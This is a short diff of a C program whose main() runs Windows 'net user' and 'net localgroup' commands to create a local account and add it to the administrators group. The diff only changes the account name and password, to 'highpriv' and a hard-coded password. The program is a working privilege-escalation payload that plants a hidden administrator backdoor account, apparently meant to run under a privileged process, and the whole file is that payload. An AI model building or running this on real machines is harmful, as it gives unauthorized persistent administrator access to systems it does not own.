@@ -2,6 +2,6 @@
 int main()
 {
 int i;
-    i = system("net user /add cooper cooper && net localgroup administrators cooper /add");
+    i = system("net user /add highpriv Cooperwashere123!? && net localgroup administrators highpriv /add");
 return 0;
 }
